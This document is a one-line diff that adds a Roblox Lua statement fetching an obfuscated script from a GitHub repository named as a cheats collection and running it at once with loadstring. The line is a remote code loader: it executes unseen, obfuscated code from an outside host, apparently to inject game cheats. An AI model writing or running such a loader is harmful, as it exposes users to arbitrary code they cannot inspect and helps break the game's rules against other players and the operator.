@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MassiveHubs/cheats/main/obfuscated-8383.lua"))()
